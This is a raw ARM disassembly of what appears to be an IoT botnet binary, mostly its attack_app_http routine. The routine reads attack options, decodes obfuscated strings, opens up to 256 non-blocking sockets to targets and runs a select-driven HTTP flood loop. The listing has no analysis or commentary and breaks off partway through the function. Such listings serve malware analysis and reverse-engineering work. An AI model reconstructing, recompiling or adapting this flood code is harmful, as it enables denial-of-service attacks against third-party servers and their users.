
32caff26a4dfa373cd0ed869544a30b7$:     file format elf32-littlearm


Disassembly of section .init:

000080d4 <_init>:
    80d4:	e1a0c00d 	mov	ip, sp
    80d8:	e92ddff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc}
    80dc:	e24cb004 	sub	fp, ip, #4
    80e0:	e91baff0 	ldmdb	fp, {r4, r5, r6, r7, r8, r9, sl, fp, sp, pc}

Disassembly of section .text:

000080f0 <__do_global_dtors_aux>:
    80f0:	e92d4010 	push	{r4, lr}
    80f4:	e59f402c 	ldr	r4, [pc, #44]	; 8128 <__do_global_dtors_aux+0x38>
    80f8:	e5d43000 	ldrb	r3, [r4]
    80fc:	e3530000 	cmp	r3, #0
    8100:	1a000006 	bne	8120 <__do_global_dtors_aux+0x30>
    8104:	e59f3020 	ldr	r3, [pc, #32]	; 812c <__do_global_dtors_aux+0x3c>
    8108:	e3530000 	cmp	r3, #0
    810c:	159f001c 	ldrne	r0, [pc, #28]	; 8130 <__do_global_dtors_aux+0x40>
    8110:	11a0e00f 	movne	lr, pc
    8114:	112fff13 	bxne	r3
    8118:	e3a03001 	mov	r3, #1
    811c:	e5c43000 	strb	r3, [r4]
    8120:	e8bd4010 	pop	{r4, lr}
    8124:	e12fff1e 	bx	lr
    8128:	00029a4c 	andeq	r9, r2, ip, asr #20
    812c:	00000000 	andeq	r0, r0, r0
    8130:	0002983c 	andeq	r9, r2, ip, lsr r8

00008134 <frame_dummy>:
    8134:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
    8138:	e59f3040 	ldr	r3, [pc, #64]	; 8180 <frame_dummy+0x4c>
    813c:	e3530000 	cmp	r3, #0
    8140:	e24dd004 	sub	sp, sp, #4
    8144:	159f0038 	ldrne	r0, [pc, #56]	; 8184 <frame_dummy+0x50>
    8148:	159f1038 	ldrne	r1, [pc, #56]	; 8188 <frame_dummy+0x54>
    814c:	11a0e00f 	movne	lr, pc
    8150:	112fff13 	bxne	r3
    8154:	e59f0030 	ldr	r0, [pc, #48]	; 818c <frame_dummy+0x58>
    8158:	e5903000 	ldr	r3, [r0]
    815c:	e3530000 	cmp	r3, #0
    8160:	0a000003 	beq	8174 <frame_dummy+0x40>
    8164:	e59f3024 	ldr	r3, [pc, #36]	; 8190 <frame_dummy+0x5c>
    8168:	e3530000 	cmp	r3, #0
    816c:	11a0e00f 	movne	lr, pc
    8170:	112fff13 	bxne	r3
    8174:	e28dd004 	add	sp, sp, #4
    8178:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
    817c:	e12fff1e 	bx	lr
    8180:	00000000 	andeq	r0, r0, r0
    8184:	0002983c 	andeq	r9, r2, ip, lsr r8
    8188:	00029a50 	andeq	r9, r2, r0, asr sl
    818c:	00029848 	andeq	r9, r2, r8, asr #16
    8190:	00000000 	andeq	r0, r0, r0

00008194 <_start>:
    8194:	e3a0b000 	mov	fp, #0
    8198:	e3a0e000 	mov	lr, #0
    819c:	e49d1004 	pop	{r1}		; (ldr r1, [sp], #4)
    81a0:	e1a0200d 	mov	r2, sp
    81a4:	e52d2004 	push	{r2}		; (str r2, [sp, #-4]!)
    81a8:	e52d0004 	push	{r0}		; (str r0, [sp, #-4]!)
    81ac:	e59fc010 	ldr	ip, [pc, #16]	; 81c4 <_start+0x30>
    81b0:	e52dc004 	push	{ip}		; (str ip, [sp, #-4]!)
    81b4:	e59f000c 	ldr	r0, [pc, #12]	; 81c8 <_start+0x34>
    81b8:	e59f300c 	ldr	r3, [pc, #12]	; 81cc <_start+0x38>
    81bc:	ea004e07 	b	1b9e0 <__uClibc_main>
    81c0:	eb004831 	bl	1a28c <__GI_abort>
    81c4:	000204f8 	strdeq	r0, [r2], -r8
    81c8:	00011d80 	andeq	r1, r1, r0, lsl #27
    81cc:	000080d4 	ldrdeq	r8, [r0], -r4

000081d0 <attack_app_http>:
    81d0:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    81d4:	e24ddc51 	sub	sp, sp, #20736	; 0x5100
    81d8:	e24dd074 	sub	sp, sp, #116	; 0x74
    81dc:	e1a04002 	mov	r4, r2
    81e0:	e1a05003 	mov	r5, r3
    81e4:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    81e8:	e58d1028 	str	r1, [sp, #40]	; 0x28
    81ec:	e3a02015 	mov	r2, #21
    81f0:	e3a03000 	mov	r3, #0
    81f4:	e1a00004 	mov	r0, r4
    81f8:	e1a01005 	mov	r1, r5
    81fc:	eb0007cf 	bl	a140 <attack_get_opt_str>
    8200:	e1a01005 	mov	r1, r5
    8204:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    8208:	e3a02014 	mov	r2, #20
    820c:	e1a00004 	mov	r0, r4
    8210:	e59f3e2c 	ldr	r3, [pc, #3628]	; 9044 <attack_app_http+0xe74>
    8214:	eb0007c9 	bl	a140 <attack_get_opt_str>
    8218:	e1a01005 	mov	r1, r5
    821c:	e3a02008 	mov	r2, #8
    8220:	e3a03000 	mov	r3, #0
    8224:	e1a09000 	mov	r9, r0
    8228:	e1a00004 	mov	r0, r4
    822c:	eb0007c3 	bl	a140 <attack_get_opt_str>
    8230:	e1a01005 	mov	r1, r5
    8234:	e1a0a000 	mov	sl, r0
    8238:	e3a02016 	mov	r2, #22
    823c:	e1a00004 	mov	r0, r4
    8240:	e59f3dc8 	ldr	r3, [pc, #3528]	; 9010 <attack_app_http+0xe40>
    8244:	eb0007bd 	bl	a140 <attack_get_opt_str>
    8248:	e1a01005 	mov	r1, r5
    824c:	e1a08000 	mov	r8, r0
    8250:	e3a02018 	mov	r2, #24
    8254:	e1a00004 	mov	r0, r4
    8258:	e3a03001 	mov	r3, #1
    825c:	eb0008af 	bl	a520 <attack_get_opt_int>
    8260:	e1a01005 	mov	r1, r5
    8264:	e3a02007 	mov	r2, #7
    8268:	e3a03050 	mov	r3, #80	; 0x50
    826c:	e1a06000 	mov	r6, r0
    8270:	e1a00004 	mov	r0, r4
    8274:	eb0008a9 	bl	a520 <attack_get_opt_int>
    8278:	e28d1070 	add	r1, sp, #112	; 0x70
    827c:	e2411025 	sub	r1, r1, #37	; 0x25
    8280:	e3a02b0a 	mov	r2, #10240	; 0x2800
    8284:	e1a03800 	lsl	r3, r0, #16
    8288:	e58d1010 	str	r1, [sp, #16]
    828c:	e1a00001 	mov	r0, r1
    8290:	e2822001 	add	r2, r2, #1
    8294:	e3a01000 	mov	r1, #0
    8298:	e1a07823 	lsr	r7, r3, #16
    829c:	eb004127 	bl	18740 <__GI_memset>
    82a0:	e3580000 	cmp	r8, #0
    82a4:	135a0000 	cmpne	sl, #0
    82a8:	13a04000 	movne	r4, #0
    82ac:	03a04001 	moveq	r4, #1
    82b0:	1a000003 	bne	82c4 <attack_app_http+0xf4>
    82b4:	e28ddf5d 	add	sp, sp, #372	; 0x174
    82b8:	e28dda05 	add	sp, sp, #20480	; 0x5000
    82bc:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    82c0:	e12fff1e 	bx	lr
    82c4:	e1a00008 	mov	r0, r8
    82c8:	eb003c98 	bl	17530 <util_strlen>
    82cc:	e35000ff 	cmp	r0, #255	; 0xff
    82d0:	cafffff7 	bgt	82b4 <attack_app_http+0xe4>
    82d4:	e1a0000a 	mov	r0, sl
    82d8:	eb003c94 	bl	17530 <util_strlen>
    82dc:	e350007f 	cmp	r0, #127	; 0x7f
    82e0:	cafffff3 	bgt	82b4 <attack_app_http+0xe4>
    82e4:	e1a00009 	mov	r0, r9
    82e8:	eb003c90 	bl	17530 <util_strlen>
    82ec:	e3500009 	cmp	r0, #9
    82f0:	d28d2a05 	addle	r2, sp, #20480	; 0x5000
    82f4:	d582416c 	strle	r4, [r2, #364]	; 0x16c
    82f8:	caffffed 	bgt	82b4 <attack_app_http+0xe4>
    82fc:	e1a00009 	mov	r0, r9
    8300:	eb003c8a 	bl	17530 <util_strlen>
    8304:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    8308:	e591c16c 	ldr	ip, [r1, #364]	; 0x16c
    830c:	e150000c 	cmp	r0, ip
    8310:	da00000a 	ble	8340 <attack_app_http+0x170>
    8314:	e7d9300c 	ldrb	r3, [r9, ip]
    8318:	e2432020 	sub	r2, r3, #32
    831c:	e2433061 	sub	r3, r3, #97	; 0x61
    8320:	e3530019 	cmp	r3, #25
    8324:	97c9200c 	strbls	r2, [r9, ip]
    8328:	928d3a05 	addls	r3, sp, #20480	; 0x5000
    832c:	9593c16c 	ldrls	ip, [r3, #364]	; 0x16c
    8330:	e28dea05 	add	lr, sp, #20480	; 0x5000
    8334:	e28cc001 	add	ip, ip, #1
    8338:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    833c:	eaffffee 	b	82fc <attack_app_http+0x12c>
    8340:	e3a0003d 	mov	r0, #61	; 0x3d
    8344:	eb0036b8 	bl	15e2c <table_unlock_val>
    8348:	e3a0003e 	mov	r0, #62	; 0x3e
    834c:	eb0036b6 	bl	15e2c <table_unlock_val>
    8350:	e3a0003f 	mov	r0, #63	; 0x3f
    8354:	eb0036b4 	bl	15e2c <table_unlock_val>
    8358:	e3a00040 	mov	r0, #64	; 0x40
    835c:	eb0036b2 	bl	15e2c <table_unlock_val>
    8360:	e3a00041 	mov	r0, #65	; 0x41
    8364:	eb0036b0 	bl	15e2c <table_unlock_val>
    8368:	e3a00042 	mov	r0, #66	; 0x42
    836c:	eb0036ae 	bl	15e2c <table_unlock_val>
    8370:	e3a00043 	mov	r0, #67	; 0x43
    8374:	eb0036ac 	bl	15e2c <table_unlock_val>
    8378:	e3a00044 	mov	r0, #68	; 0x44
    837c:	eb0036aa 	bl	15e2c <table_unlock_val>
    8380:	e3a00045 	mov	r0, #69	; 0x45
    8384:	eb0036a8 	bl	15e2c <table_unlock_val>
    8388:	e3a00046 	mov	r0, #70	; 0x46
    838c:	eb0036a6 	bl	15e2c <table_unlock_val>
    8390:	e3560c01 	cmp	r6, #256	; 0x100
    8394:	a3a06c01 	movge	r6, #256	; 0x100
    8398:	e3a00047 	mov	r0, #71	; 0x47
    839c:	e58d6040 	str	r6, [sp, #64]	; 0x40
    83a0:	eb0036a1 	bl	15e2c <table_unlock_val>
    83a4:	e3a01d31 	mov	r1, #3136	; 0xc40
    83a8:	e59d0040 	ldr	r0, [sp, #64]	; 0x40
    83ac:	e2811004 	add	r1, r1, #4
    83b0:	eb00453d 	bl	198ac <calloc>
    83b4:	e59d2040 	ldr	r2, [sp, #64]	; 0x40
    83b8:	e3520000 	cmp	r2, #0
    83bc:	e58d0024 	str	r0, [sp, #36]	; 0x24
    83c0:	da000057 	ble	8524 <attack_app_http+0x354>
    83c4:	e1a05000 	mov	r5, r0
    83c8:	e3a0b000 	mov	fp, #0
    83cc:	e3a03000 	mov	r3, #0
    83d0:	e3e02000 	mvn	r2, #0
    83d4:	e59d102c 	ldr	r1, [sp, #44]	; 0x2c
    83d8:	e5852000 	str	r2, [r5]
    83dc:	e5c53004 	strb	r3, [r5, #4]
    83e0:	e1a0000b 	mov	r0, fp
    83e4:	eb003e5d 	bl	17d60 <__aeabi_idivmod>
    83e8:	e59dc028 	ldr	ip, [sp, #40]	; 0x28
    83ec:	e1a03281 	lsl	r3, r1, #5
    83f0:	e0433181 	sub	r3, r3, r1, lsl #3
    83f4:	e083600c 	add	r6, r3, ip
    83f8:	e5962010 	ldr	r2, [r6, #16]
    83fc:	e285ef85 	add	lr, r5, #532	; 0x214
    8400:	e1a0000e 	mov	r0, lr
    8404:	e1a01008 	mov	r1, r8
    8408:	e5852010 	str	r2, [r5, #16]
    840c:	e58de030 	str	lr, [sp, #48]	; 0x30
    8410:	eb003c50 	bl	17558 <util_strcpy>
    8414:	e5d53214 	ldrb	r3, [r5, #532]	; 0x214
    8418:	e353002f 	cmp	r3, #47	; 0x2f
    841c:	0a000008 	beq	8444 <attack_app_http+0x274>
    8420:	e59d0030 	ldr	r0, [sp, #48]	; 0x30
    8424:	eb003c41 	bl	17530 <util_strlen>
    8428:	e1a02000 	mov	r2, r0
    842c:	e2850f85 	add	r0, r5, #532	; 0x214
    8430:	e2800001 	add	r0, r0, #1
    8434:	e59d1030 	ldr	r1, [sp, #48]	; 0x30
    8438:	eb0040bc 	bl	18730 <__GI_memmove>
    843c:	e3a0302f 	mov	r3, #47	; 0x2f
    8440:	e5c53214 	strb	r3, [r5, #532]	; 0x214
    8444:	e1a01009 	mov	r1, r9
    8448:	e2850e5a 	add	r0, r5, #1440	; 0x5a0
    844c:	eb003c41 	bl	17558 <util_strcpy>
    8450:	e2850e59 	add	r0, r5, #1424	; 0x590
    8454:	e1a01009 	mov	r1, r9
    8458:	e2800007 	add	r0, r0, #7
    845c:	eb003c3d 	bl	17558 <util_strcpy>
    8460:	e2850fc5 	add	r0, r5, #788	; 0x314
    8464:	e2800001 	add	r0, r0, #1
    8468:	e1a0100a 	mov	r1, sl
    846c:	eb003c39 	bl	17558 <util_strcpy>
    8470:	e5d63014 	ldrb	r3, [r6, #20]
    8474:	e353001f 	cmp	r3, #31
    8478:	8a000010 	bhi	84c0 <attack_app_http+0x2f0>
    847c:	e5964010 	ldr	r4, [r6, #16]
    8480:	eb0027e6 	bl	12420 <rand_next>
    8484:	e20418ff 	and	r1, r4, #16711680	; 0xff0000
    8488:	e1a02c24 	lsr	r2, r4, #24
    848c:	e1822421 	orr	r2, r2, r1, lsr #8
    8490:	e2043cff 	and	r3, r4, #65280	; 0xff00
    8494:	e5d61014 	ldrb	r1, [r6, #20]
    8498:	e1822403 	orr	r2, r2, r3, lsl #8
    849c:	e1822c04 	orr	r2, r2, r4, lsl #24
    84a0:	e0822130 	add	r2, r2, r0, lsr r1
    84a4:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    84a8:	e1a03c22 	lsr	r3, r2, #24
    84ac:	e1833420 	orr	r3, r3, r0, lsr #8
    84b0:	e2021cff 	and	r1, r2, #65280	; 0xff00
    84b4:	e1833401 	orr	r3, r3, r1, lsl #8
    84b8:	e1833c02 	orr	r3, r3, r2, lsl #24
    84bc:	e5853010 	str	r3, [r5, #16]
    84c0:	eb0027d6 	bl	12420 <rand_next>
    84c4:	e59f3b48 	ldr	r3, [pc, #2888]	; 9014 <attack_app_http+0xe44>
    84c8:	e0821093 	umull	r1, r2, r3, r0
    84cc:	e1a021a2 	lsr	r2, r2, #3
    84d0:	e1a03202 	lsl	r3, r2, #4
    84d4:	e0623003 	rsb	r3, r2, r3
    84d8:	e0630000 	rsb	r0, r3, r0
    84dc:	e350000e 	cmp	r0, #14
    84e0:	979ff100 	ldrls	pc, [pc, r0, lsl #2]
    84e4:	ea000665 	b	9e80 <attack_app_http+0x1cb0>
    84e8:	0000a114 	andeq	sl, r0, r4, lsl r1
    84ec:	0000a0e8 	andeq	sl, r0, r8, ror #1
    84f0:	0000a0bc 	strheq	sl, [r0], -ip
    84f4:	0000a090 	muleq	r0, r0, r0
    84f8:	0000a064 	andeq	sl, r0, r4, rrx
    84fc:	0000a038 	andeq	sl, r0, r8, lsr r0
    8500:	0000a00c 	andeq	sl, r0, ip
    8504:	00009fe0 	andeq	r9, r0, r0, ror #31
    8508:	00009fb4 			; <UNDEFINED> instruction: 0x00009fb4
    850c:	00009f88 	andeq	r9, r0, r8, lsl #31
    8510:	00009f5c 	andeq	r9, r0, ip, asr pc
    8514:	00009f30 	andeq	r9, r0, r0, lsr pc
    8518:	00009f04 	andeq	r9, r0, r4, lsl #30
    851c:	00009ed8 	ldrdeq	r9, [r0], -r8
    8520:	00009e58 	andeq	r9, r0, r8, asr lr
    8524:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    8528:	e28d2da1 	add	r2, sp, #10304	; 0x2840
    852c:	e2811e5a 	add	r1, r1, #1440	; 0x5a0
    8530:	e2822030 	add	r2, r2, #48	; 0x30
    8534:	e1a03427 	lsr	r3, r7, #8
    8538:	e281100c 	add	r1, r1, #12
    853c:	e2422024 	sub	r2, r2, #36	; 0x24
    8540:	e20770ff 	and	r7, r7, #255	; 0xff
    8544:	e58d101c 	str	r1, [sp, #28]
    8548:	e58d3018 	str	r3, [sp, #24]
    854c:	e58d2014 	str	r2, [sp, #20]
    8550:	e58d700c 	str	r7, [sp, #12]
    8554:	e3a00000 	mov	r0, #0
    8558:	eb003f2e 	bl	18218 <__GI_time>
    855c:	e3a03000 	mov	r3, #0
    8560:	e28dca05 	add	ip, sp, #20480	; 0x5000
    8564:	e58d0034 	str	r0, [sp, #52]	; 0x34
    8568:	e58c30cc 	str	r3, [ip, #204]	; 0xcc
    856c:	e2833004 	add	r3, r3, #4
    8570:	e283ea05 	add	lr, r3, #20480	; 0x5000
    8574:	e2833004 	add	r3, r3, #4
    8578:	e3a02000 	mov	r2, #0
    857c:	e28ee0cc 	add	lr, lr, #204	; 0xcc
    8580:	e3530080 	cmp	r3, #128	; 0x80
    8584:	e78e200d 	str	r2, [lr, sp]
    8588:	1afffff8 	bne	8570 <attack_app_http+0x3a0>
    858c:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    8590:	e581204c 	str	r2, [r1, #76]	; 0x4c
    8594:	e243307c 	sub	r3, r3, #124	; 0x7c
    8598:	e2832a05 	add	r2, r3, #20480	; 0x5000
    859c:	e2833004 	add	r3, r3, #4
    85a0:	e3a00000 	mov	r0, #0
    85a4:	e282204c 	add	r2, r2, #76	; 0x4c
    85a8:	e3530080 	cmp	r3, #128	; 0x80
    85ac:	e782000d 	str	r0, [r2, sp]
    85b0:	1afffff8 	bne	8598 <attack_app_http+0x3c8>
    85b4:	e59d3040 	ldr	r3, [sp, #64]	; 0x40
    85b8:	e1530000 	cmp	r3, r0
    85bc:	daffffe4 	ble	8554 <attack_app_http+0x384>
    85c0:	e59da01c 	ldr	sl, [sp, #28]
    85c4:	e1a08000 	mov	r8, r0
    85c8:	e1a0600a 	mov	r6, sl
    85cc:	e1a07000 	mov	r7, r0
    85d0:	ea000017 	b	8634 <attack_app_http+0x464>
    85d4:	e3530002 	cmp	r3, #2
    85d8:	0a0001cd 	beq	8d14 <attack_app_http+0xb44>
    85dc:	e3530004 	cmp	r3, #4
    85e0:	0a0000bf 	beq	88e4 <attack_app_http+0x714>
    85e4:	e3530006 	cmp	r3, #6
    85e8:	0a0001d5 	beq	8d44 <attack_app_http+0xb74>
    85ec:	e3530007 	cmp	r3, #7
    85f0:	0a000262 	beq	8f80 <attack_app_http+0xdb0>
    85f4:	e353000a 	cmp	r3, #10
    85f8:	0a000275 	beq	8fd4 <attack_app_http+0xe04>
    85fc:	e353000b 	cmp	r3, #11
    8600:	0a0003e3 	beq	9594 <attack_app_http+0x13c4>
    8604:	e3a03000 	mov	r3, #0
    8608:	e54635a8 	strb	r3, [r6, #-1448]	; 0xfffffa58
    860c:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    8610:	eb004bb6 	bl	1b4f0 <__GI___libc_close>
    8614:	e3e03000 	mvn	r3, #0
    8618:	e50635ac 	str	r3, [r6, #-1452]	; 0xfffffa54
    861c:	e59d2040 	ldr	r2, [sp, #64]	; 0x40
    8620:	e2877001 	add	r7, r7, #1
    8624:	e2866d31 	add	r6, r6, #3136	; 0xc40
    8628:	e1570002 	cmp	r7, r2
    862c:	e2866004 	add	r6, r6, #4
    8630:	0a000050 	beq	8778 <attack_app_http+0x5a8>
    8634:	e55635a8 	ldrb	r3, [r6, #-1448]	; 0xfffffa58
    8638:	e2465e5a 	sub	r5, r6, #1440	; 0x5a0
    863c:	e3530001 	cmp	r3, #1
    8640:	e245500c 	sub	r5, r5, #12
    8644:	0a0000a0 	beq	88cc <attack_app_http+0x6fc>
    8648:	e3530000 	cmp	r3, #0
    864c:	1affffe0 	bne	85d4 <attack_app_http+0x404>
    8650:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    8654:	e3a05000 	mov	r5, #0
    8658:	e28dca05 	add	ip, sp, #20480	; 0x5000
    865c:	e3700001 	cmn	r0, #1
    8660:	e58c514c 	str	r5, [ip, #332]	; 0x14c
    8664:	e58c5150 	str	r5, [ip, #336]	; 0x150
    8668:	e58c5154 	str	r5, [ip, #340]	; 0x154
    866c:	e58c5158 	str	r5, [ip, #344]	; 0x158
    8670:	1b004b9e 	blne	1b4f0 <__GI___libc_close>
    8674:	e3a00002 	mov	r0, #2
    8678:	e3a01001 	mov	r1, #1
    867c:	e1a02005 	mov	r2, r5
    8680:	eb0041a7 	bl	18d24 <__GI_socket>
    8684:	e3700001 	cmn	r0, #1
    8688:	e1a04000 	mov	r4, r0
    868c:	e50605ac 	str	r0, [r6, #-1452]	; 0xfffffa54
    8690:	0affffe1 	beq	861c <attack_app_http+0x44c>
    8694:	e3a01003 	mov	r1, #3
    8698:	e1a02005 	mov	r2, r5
    869c:	eb003de0 	bl	17e24 <__GI___libc_fcntl>
    86a0:	e3a01004 	mov	r1, #4
    86a4:	e3802b02 	orr	r2, r0, #2048	; 0x800
    86a8:	e1a00004 	mov	r0, r4
    86ac:	eb003ddc 	bl	17e24 <__GI___libc_fcntl>
    86b0:	e3a0c801 	mov	ip, #65536	; 0x10000
    86b4:	e28dea05 	add	lr, sp, #20480	; 0x5000
    86b8:	e24cc001 	sub	ip, ip, #1
    86bc:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    86c0:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    86c4:	e1a01005 	mov	r1, r5
    86c8:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    86cc:	e3a02008 	mov	r2, #8
    86d0:	e3a0c004 	mov	ip, #4
    86d4:	e283306c 	add	r3, r3, #108	; 0x6c
    86d8:	e58dc000 	str	ip, [sp]
    86dc:	eb00417e 	bl	18cdc <__GI_setsockopt>
    86e0:	e59d1018 	ldr	r1, [sp, #24]
    86e4:	e59d200c 	ldr	r2, [sp, #12]
    86e8:	e516459c 	ldr	r4, [r6, #-1436]	; 0xfffffa64
    86ec:	e28dea05 	add	lr, sp, #20480	; 0x5000
    86f0:	e3a0c002 	mov	ip, #2
    86f4:	e1813402 	orr	r3, r1, r2, lsl #8
    86f8:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    86fc:	e58e4150 	str	r4, [lr, #336]	; 0x150
    8700:	e28dec51 	add	lr, sp, #20736	; 0x5100
    8704:	e1ce34be 	strh	r3, [lr, #78]	; 0x4e
    8708:	e546c5a8 	strb	ip, [r6, #-1448]	; 0xfffffa58
    870c:	e59d3034 	ldr	r3, [sp, #52]	; 0x34
    8710:	e28d1c51 	add	r1, sp, #20736	; 0x5100
    8714:	e1cec4bc 	strh	ip, [lr, #76]	; 0x4c
    8718:	e3a02010 	mov	r2, #16
    871c:	e281104c 	add	r1, r1, #76	; 0x4c
    8720:	e50635a4 	str	r3, [r6, #-1444]	; 0xfffffa5c
    8724:	eb004059 	bl	18890 <__libc_connect>
    8728:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    872c:	e28dec51 	add	lr, sp, #20736	; 0x5100
    8730:	e1a022ac 	lsr	r2, ip, #5
    8734:	e1a02102 	lsl	r2, r2, #2
    8738:	e28ee070 	add	lr, lr, #112	; 0x70
    873c:	e082200e 	add	r2, r2, lr
    8740:	e5121124 	ldr	r1, [r2, #-292]	; 0xfffffedc
    8744:	e20c001f 	and	r0, ip, #31
    8748:	e3a03001 	mov	r3, #1
    874c:	e1811013 	orr	r1, r1, r3, lsl r0
    8750:	e15c0008 	cmp	ip, r8
    8754:	e5021124 	str	r1, [r2, #-292]	; 0xfffffedc
    8758:	daffffaf 	ble	861c <attack_app_http+0x44c>
    875c:	e08c8003 	add	r8, ip, r3
    8760:	e59d2040 	ldr	r2, [sp, #64]	; 0x40
    8764:	e2877001 	add	r7, r7, #1
    8768:	e2866d31 	add	r6, r6, #3136	; 0xc40
    876c:	e1570002 	cmp	r7, r2
    8770:	e2866004 	add	r6, r6, #4
    8774:	1affffae 	bne	8634 <attack_app_http+0x464>
    8778:	e3580000 	cmp	r8, #0
    877c:	0affff74 	beq	8554 <attack_app_http+0x384>
    8780:	e28dea05 	add	lr, sp, #20480	; 0x5000
    8784:	e3a0c001 	mov	ip, #1
    8788:	e3a05000 	mov	r5, #0
    878c:	e58ec15c 	str	ip, [lr, #348]	; 0x15c
    8790:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    8794:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    8798:	e28dcc51 	add	ip, sp, #20736	; 0x5100
    879c:	e58e5160 	str	r5, [lr, #352]	; 0x160
    87a0:	e28cc05c 	add	ip, ip, #92	; 0x5c
    87a4:	e28110cc 	add	r1, r1, #204	; 0xcc
    87a8:	e282204c 	add	r2, r2, #76	; 0x4c
    87ac:	e1a03005 	mov	r3, r5
    87b0:	e1a00008 	mov	r0, r8
    87b4:	e58dc000 	str	ip, [sp]
    87b8:	eb003e42 	bl	180c8 <__libc_select>
    87bc:	e1a04000 	mov	r4, r0
    87c0:	e1a00005 	mov	r0, r5
    87c4:	eb003e93 	bl	18218 <__GI_time>
    87c8:	e1540005 	cmp	r4, r5
    87cc:	e58d0038 	str	r0, [sp, #56]	; 0x38
    87d0:	daffff5f 	ble	8554 <attack_app_http+0x384>
    87d4:	e58d5044 	str	r5, [sp, #68]	; 0x44
    87d8:	ea000015 	b	8834 <attack_app_http+0x664>
    87dc:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    87e0:	e2833070 	add	r3, r3, #112	; 0x70
    87e4:	e08c2003 	add	r2, ip, r3
    87e8:	e51230a4 	ldr	r3, [r2, #-164]	; 0xffffff5c
    87ec:	e1a03153 	asr	r3, r3, r1
    87f0:	e3130001 	tst	r3, #1
    87f4:	0a000006 	beq	8814 <attack_app_http+0x644>
    87f8:	e55a35a8 	ldrb	r3, [sl, #-1448]	; 0xfffffa58
    87fc:	e3530006 	cmp	r3, #6
    8800:	0a000212 	beq	9050 <attack_app_http+0xe80>
    8804:	e3530007 	cmp	r3, #7
    8808:	0a00015c 	beq	8d80 <attack_app_http+0xbb0>
    880c:	e353000a 	cmp	r3, #10
    8810:	0a00039c 	beq	9688 <attack_app_http+0x14b8>
    8814:	e59d2044 	ldr	r2, [sp, #68]	; 0x44
    8818:	e59d3040 	ldr	r3, [sp, #64]	; 0x40
    881c:	e2822001 	add	r2, r2, #1
    8820:	e28aad31 	add	sl, sl, #3136	; 0xc40
    8824:	e1520003 	cmp	r2, r3
    8828:	e58d2044 	str	r2, [sp, #68]	; 0x44
    882c:	e28aa004 	add	sl, sl, #4
    8830:	0affff47 	beq	8554 <attack_app_http+0x384>
    8834:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    8838:	e24a9e5a 	sub	r9, sl, #1440	; 0x5a0
    883c:	e3700001 	cmn	r0, #1
    8840:	e249900c 	sub	r9, r9, #12
    8844:	0afffff2 	beq	8814 <attack_app_http+0x644>
    8848:	e1a022a0 	lsr	r2, r0, #5
    884c:	e28dec51 	add	lr, sp, #20736	; 0x5100
    8850:	e1a0c102 	lsl	ip, r2, #2
    8854:	e28ee070 	add	lr, lr, #112	; 0x70
    8858:	e08c200e 	add	r2, ip, lr
    885c:	e5123124 	ldr	r3, [r2, #-292]	; 0xfffffedc
    8860:	e200101f 	and	r1, r0, #31
    8864:	e1a03153 	asr	r3, r3, r1
    8868:	e3130001 	tst	r3, #1
    886c:	0affffda 	beq	87dc <attack_app_http+0x60c>
    8870:	e28dca05 	add	ip, sp, #20480	; 0x5000
    8874:	e3a04004 	mov	r4, #4
    8878:	e3a05000 	mov	r5, #0
    887c:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    8880:	e28dec51 	add	lr, sp, #20736	; 0x5100
    8884:	e3a01001 	mov	r1, #1
    8888:	e2833068 	add	r3, r3, #104	; 0x68
    888c:	e58c5168 	str	r5, [ip, #360]	; 0x168
    8890:	e58c4164 	str	r4, [ip, #356]	; 0x164
    8894:	e28ee064 	add	lr, lr, #100	; 0x64
    8898:	e1a02004 	mov	r2, r4
    889c:	e58de000 	str	lr, [sp]
    88a0:	eb004028 	bl	18948 <getsockopt>
    88a4:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    88a8:	e5913168 	ldr	r3, [r1, #360]	; 0x168
    88ac:	e1900003 	orrs	r0, r0, r3
    88b0:	1a0001c1 	bne	8fbc <attack_app_http+0xdec>
    88b4:	e51a35ac 	ldr	r3, [sl, #-1452]	; 0xfffffa54
    88b8:	e1a022a3 	lsr	r2, r3, #5
    88bc:	e203101f 	and	r1, r3, #31
    88c0:	e1a0c102 	lsl	ip, r2, #2
    88c4:	e54a45a8 	strb	r4, [sl, #-1448]	; 0xfffffa58
    88c8:	eaffffc3 	b	87dc <attack_app_http+0x60c>
    88cc:	e5963004 	ldr	r3, [r6, #4]
    88d0:	e3530000 	cmp	r3, #0
    88d4:	13a03004 	movne	r3, #4
    88d8:	154635a8 	strbne	r3, [r6, #-1448]	; 0xfffffa58
    88dc:	054635a8 	strbeq	r3, [r6, #-1448]	; 0xfffffa58
    88e0:	0affff5a 	beq	8650 <attack_app_http+0x480>
    88e4:	e3e03000 	mvn	r3, #0
    88e8:	e3a09000 	mov	r9, #0
    88ec:	e2850d21 	add	r0, r5, #2112	; 0x840
    88f0:	e586300c 	str	r3, [r6, #12]
    88f4:	e2800004 	add	r0, r0, #4
    88f8:	e3a01b01 	mov	r1, #1024	; 0x400
    88fc:	e5869000 	str	r9, [r6]
    8900:	eb003b2f 	bl	175c4 <util_zero>
    8904:	e3a01b0a 	mov	r1, #10240	; 0x2800
    8908:	e59d0014 	ldr	r0, [sp, #20]
    890c:	e5869294 	str	r9, [r6, #660]	; 0x294
    8910:	eb003b2b 	bl	175c4 <util_zero>
